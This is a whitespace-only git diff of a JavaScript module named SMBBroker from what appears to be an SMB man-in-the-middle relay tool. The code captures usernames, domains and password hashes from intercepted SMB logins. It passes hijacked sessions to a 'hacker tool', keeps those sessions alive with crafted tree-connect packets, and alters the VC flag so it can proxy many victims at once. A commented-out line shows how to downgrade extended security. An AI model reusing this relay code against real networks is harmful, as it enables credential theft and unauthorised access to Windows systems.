@@ -33,7 +33,7 @@ module.exports.SMBBroker = function() {
     this.port = function() { return 445 };
 
     this.inTransition = function() { 
-	return !this.authorizer.authenticated;
+        return !this.authorizer.authenticated;
     }
 
     this.banner = function(sock1, sock2) {
@@ -41,15 +41,15 @@ module.exports.SMBBroker = function() {
         // sock2 == middler
         out.blue("Authenticating hacker tool");
         var smb_userid = sock2.attributes.userid; // getSMBUserID();
-	if(smb_userid) {
-	    this.authorizer = new auth.SMBAuth(sock1);
+        if(smb_userid) {
+            this.authorizer = new auth.SMBAuth(sock1);
             this.authorizer.set_uid(smb_userid);
-	} else {
-	    out.red("This middler never found a UID -- was it routed to itself?");
-	    sock1.end();
-	    return false;
-	}
-	return true;
+        } else {
+            out.red("This middler never found a UID -- was it routed to itself?");
+            sock1.end();
+            return false;
+        }
+        return true;
     }
 
     this.reviewServerPacket = function(packet, client, middler) {
@@ -58,17 +58,17 @@ module.exports.SMBBroker = function() {
         // sources of the "client" socket to set it to undefined
         // or false when closing.
 
-	middler.freshen();
-	// packet.buffer.writeUInt16LE(middler.oldpid, 0x1e);
+        middler.freshen();
+        // packet.buffer.writeUInt16LE(middler.oldpid, 0x1e);
         if(client) { 
-	    if(packet.commandCode == 0x73) {
+            if(packet.commandCode == 0x73) {
 
-		// we need to record the UID set by the server
-		// for authenticating the hacker tool properly
+                // we need to record the UID set by the server
+                // for authenticating the hacker tool properly
                 var smb_userid = packet.buffer.readUInt16LE(32);
                 middler.attributes.userid = smb_userid;
                 // middler.setSMBUserID(smb_userid);
-		out.yellow("Setting UID to " + smb_userid);
+                out.yellow("Setting UID to " + smb_userid);
 
                 //
                 // there are two 0x73 packets sent by the server during negotiation.
@@ -83,35 +83,35 @@ module.exports.SMBBroker = function() {
                     out.yellow("Setting Challenge to " + n.challenge);
                     middler.attributes.challenge = n.challenge;
                 }
-	    }
-	    client.write(packet.buffer);
-	} else {
-	    
-	    // Windows boxes drop SMB connections when there hasn't
-	    // been an open resource after 15 minutes (by default), so
-	    // we need to keep the session alive.  We can do this by
-	    // TREE_CONNECTing IPC$ and disconnecting it.  We set the
-	    // Process ID value to 0x1165 for these "pings" as a
-	    // marker so the broker can tell when it sees a tree
-	    // connect response that we need to close.  This sends the
-	    // TREE_DISCONNECT.
+            }
+            client.write(packet.buffer);
+        } else {
+            
+            // Windows boxes drop SMB connections when there hasn't
+            // been an open resource after 15 minutes (by default), so
+            // we need to keep the session alive.  We can do this by
+            // TREE_CONNECTing IPC$ and disconnecting it.  We set the
+            // Process ID value to 0x1165 for these "pings" as a
+            // marker so the broker can tell when it sees a tree
+            // connect response that we need to close.  This sends the
+            // TREE_DISCONNECT.
 
-	    if(packet.commandCode == 0x75) {
-		if(packet.buffer.readUInt16LE(30) == 0x1165) {
-		    var close  = new Buffer("00000023ff534d4271000000000801c8"+
-		        		    "00000000000000000000000004087910"+
-		        		    "00080500000000", "hex");
-		    close.writeUInt16LE(packet.buffer.readUInt16LE(28), 28);
-		    middler.getServer().write(close);
-		}
-	    }
-	}
-	
-    }	
+            if(packet.commandCode == 0x75) {
+                if(packet.buffer.readUInt16LE(30) == 0x1165) {
+                    var close  = new Buffer("00000023ff534d4271000000000801c8"+
+                                            "00000000000000000000000004087910"+
+                                            "00080500000000", "hex");
+                    close.writeUInt16LE(packet.buffer.readUInt16LE(28), 28);
+                    middler.getServer().write(close);
+                }
+            }
+        }
+        
+    }   
 
     this.reviewClientPacket = function(packet, server, middler) {
-	middler.freshen();
-	if(packet.commandCode == 0x73) {
+        middler.freshen();
+        if(packet.commandCode == 0x73) {
             if(middler.getMature()) {
                 // this shouldn't really happen... we shouldn't have
                 // any 0x73s after the connection has matured and
@@ -129,7 +129,7 @@ module.exports.SMBBroker = function() {
                 out.red("DEBUG: Packet:  " + packet.buffer);
             } else {
                 var n = new smb.CredHunter(packet.buffer);
-	        out.red("Detected username: " + n.username);
+                out.red("Detected username: " + n.username);
                 out.yellow("Hash: " + n.hash);
 
                 middler.attributes.domain = n.domain;
@@ -139,34 +139,34 @@ module.exports.SMBBroker = function() {
                 middler.attributes.hash = n.hash;
                 middler.attributes.hashtype = n.htype;
 
-	        // This turns out to be important -- if multiple inbound
-	        // connections come in to an SMB server with the "VC" flag
-	        // set to 0x0000, then the server will kill any previous
-	        // connections.  This happens regardless of username or
-	        // authentication method.  This is obviously uncomfortable
-	        // if we're going to be proxying sessions for lots of IPs.
-	        // If we set this to any non-zero value, this keeps the
-	        // sessions alive.  Amazing how hours of testing yields
-	        // only one line of code.  Accordingly, I thought I'd
-	        // accompany it with this mega-comment to further
-	        // legitimate my efforts.
+                // This turns out to be important -- if multiple inbound
+                // connections come in to an SMB server with the "VC" flag
+                // set to 0x0000, then the server will kill any previous
+                // connections.  This happens regardless of username or
+                // authentication method.  This is obviously uncomfortable
+                // if we're going to be proxying sessions for lots of IPs.
+                // If we set this to any non-zero value, this keeps the
+                // sessions alive.  Amazing how hours of testing yields
+                // only one line of code.  Accordingly, I thought I'd
+                // accompany it with this mega-comment to further
+                // legitimate my efforts.
 
-	        packet.buffer.writeUInt16LE(0x1, 45);
+                packet.buffer.writeUInt16LE(0x1, 45);
             }
-	}
-	if(packet.commandCode != 0x74) {
-	    
-	    // downgrade to "don't use extended security"; this
-	    // only works with XP clients and earlier
-	    
-	    // var flags = packet.buffer.readUInt16LE(14);
-	    // packet.buffer.writeUInt16LE(flags & 0xf7ff, 14);
-	    
-	    server.write(packet.buffer);
-	} else {
-	    server.pause();
-	    middler.shutdown();
-	}
+        }
+        if(packet.commandCode != 0x74) {
+            
+            // downgrade to "don't use extended security"; this
+            // only works with XP clients and earlier
+            
+            // var flags = packet.buffer.readUInt16LE(14);
+            // packet.buffer.writeUInt16LE(flags & 0xf7ff, 14);
+            
+            server.write(packet.buffer);
+        } else {
+            server.pause();
+            middler.shutdown();
+        }
     }
     
     this.transit = function(packet, sock, middler, server) {
@@ -178,11 +178,11 @@ module.exports.SMBBroker = function() {
         // more than one connection.  This is fine, as
         // long as they are not simultaneous.  
 
-	this.authorizer.respond(packet.buffer);
+        this.authorizer.respond(packet.buffer);
     }
 
     this.parsePacket = function(x) {
-	return new smb.SMBPacket(x);
+        return new smb.SMBPacket(x);
     }
 
     // In the case of WINEXE, there are multiple
@@ -201,11 +201,11 @@ module.exports.SMBBroker = function() {
     // similarly.
 
     this.specialConditions = function(packet) {
-	this.hackercount == 2 && packet.commandCode == 0x25
+        this.hackercount == 2 && packet.commandCode == 0x25
     }
 
     this.handleSpecials = function(sock) {
-	sock.end();
+        sock.end();
     }
 
     // Once the client disconnects, we need to maintain the connection
@@ -218,12 +218,12 @@ module.exports.SMBBroker = function() {
         if(middler.attributes.userid) {
             middler.attributes.timerID = setInterval(function() {
 
-	        // SMB_ECHO_REQUEST packets don't keep the server alive --
-	        // there needs to be an open resource.  We can do this by
-	        // periodically connecting to the IPC$ tree and then
-	        // disconnecting.  This carrys out the TREE_CONNECT.  The
-	        // smbbroker takes care of closing the tree when the
-	        // response comes in (it needs to know the TreeID).
+                // SMB_ECHO_REQUEST packets don't keep the server alive --
+                // there needs to be an open resource.  We can do this by
+                // periodically connecting to the IPC$ tree and then
+                // disconnecting.  This carrys out the TREE_CONNECT.  The
+                // smbbroker takes care of closing the tree when the
+                // response comes in (it needs to know the TreeID).
 
                 packet = new Buffer("00000054ff534d4275000000001843c8" +
                                     "000000000000000000000000ffff6511" +
